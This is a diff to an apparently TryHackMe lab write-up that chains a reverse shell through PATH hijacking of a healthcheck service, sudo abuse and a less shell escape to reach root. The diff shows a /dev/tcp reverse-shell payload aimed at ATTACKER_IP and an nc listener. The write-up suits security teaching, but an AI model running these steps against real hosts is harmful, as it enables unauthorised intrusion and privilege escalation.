@@ -102,18 +102,14 @@ ftp> put recon.sh
 
 The processing pipeline executed the uploaded script and returned a reverse shell.
 
-The resulting context was verified with:
-
 ```bash
-whoami
-id
-```
-
-The initial shell ran as:
-
-```bash
+recon_user@tryhackme-2404:~$ whoami
 recon_user
+
+recon_user@tryhackme-2404:~$ id
+uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
 ```
+
 
 ---
 
@@ -214,13 +210,13 @@ When the periodic job ran again, a new shell connected back.
 The new identity was verified:
 
 ```bash
-whoami
-id
+dev_user@tryhackme-2404:~$ whoami
+dev_user
+
+dev_user@tryhackme-2404:~$ id
+uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)
 ```
 
-```bash
-dev_user
-```
 
 ---
 
@@ -246,7 +242,7 @@ systemctl cat healthcheck.service
 
 Relevant configuration:
 
-```ini
+```bash
 [Service]
 Type=simple
 User=monitor_user
@@ -277,25 +273,27 @@ instead of an absolute path such as:
 /usr/bin/ps
 ```
 
-The service searched for executables according to:
+When a command is executed without an absolute path, the shell searches the directories listed in `PATH` from left to right.
+
+For this service:
 
 ```bash
 /opt/dev/bin:/usr/local/bin:/usr/bin
 ```
 
-Therefore `/opt/dev/bin/ps` would be selected before the legitimate `/usr/bin/ps`.
-
-Because `dev_user` controlled `/opt/dev/bin/ps`, this created a **PATH hijacking** opportunity under the `monitor_user` context.
-
-### Executable Permission Constraint
-
-The malicious `ps` file was initially not executable.
-
-Earlier, `recon_user` could write to it through group permissions but could not change its mode. Once operating as the actual owner, `dev_user`, the executable bit could be added:
+Therefore, if an executable named `ps` existed in:
 
 ```bash
-chmod +x /opt/dev/bin/ps
+/opt/dev/bin/ps
 ```
+
+it would be selected before the legitimate:
+
+```bash
+/usr/bin/ps
+```
+
+The existing `/opt/dev/bin/ps` file was controlled by `dev_user`, making it possible to replace its contents with attacker-controlled code.
 
 A listener was started:
 
@@ -303,27 +301,27 @@ A listener was started:
 nc -lvnp 6666
 ```
 
-The fake `ps` executable was replaced with a reverse shell:
+The existing `ps` file was then overwritten with a reverse-shell payload:
 
 ```bash
 printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1"\n' > /opt/dev/bin/ps
+```
 
+The file was not executable yet, so the executable bit was added:
+
+```bash
 chmod +x /opt/dev/bin/ps
 ```
 
-When `healthcheck` next executed `ps aux`, the attacker-controlled executable ran as `monitor_user`.
-
-The new context was verified:
+When `healthcheck` next executed `ps aux`, the malicious `/opt/dev/bin/ps` ran under the `monitor_user` context and connected back to the listener.
 
 ```bash
-whoami
-id
-```
-
-```bash
+monitor_user@tryhackme-2404:/$ whoami
 monitor_user
-```
 
+monitor_user@tryhackme-2404:/$ id
+uid=1003(monitor_user) gid=1003(monitor_user) groups=1003(monitor_user)
+```
 ### Useful Failure — Inherited Malicious PATH
 
 The new shell inherited the service's PATH:
@@ -361,6 +359,9 @@ Sudo permissions were enumerated non-interactively:
 
 ```bash
 sudo -n -l
+
+options:
+-n never ask for password
 ```
 
 The relevant rule was:
@@ -432,12 +433,11 @@ sudo -u ops_user /usr/local/bin/deploy.sh
 The new shell identity was verified:
 
 ```bash
-whoami
-id
-```
-
-```bash
+ops_user@tryhackme-2404:/opt/app$ whoami
 ops_user
+
+ops_user@tryhackme-2404:/opt/app$ id
+uid=1004(ops_user) gid=1004(ops_user) groups=1004(ops_user)
 ```
 
 This demonstrates why sudo analysis must include everything executed by the allowed command, not only the explicitly permitted binary or script.
@@ -462,13 +462,13 @@ Relevant result:
 
 `less` is an interactive pager and supports shell command execution from inside its interface:
 
-```text
+```bash
 !<COMMAND>
 ```
 
 For example:
 
-```text
+```bash
 !/bin/bash
 ```
 
@@ -486,7 +486,7 @@ From the reverse shell, `less` immediately exited instead of providing a usable 
 
 Entering:
 
-```text
+```bash
 !/bin/bash
 ```
 
@@ -532,13 +532,11 @@ Then, from inside the `less` interface:
 The resulting identity was verified:
 
 ```bash
-whoami
-id
-```
-
-```bash
+root@tryhackme-2404:/opt/app# whoami
 root
-uid=0(root)
+
+root@tryhackme-2404:/opt/app# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Root access was achieved.
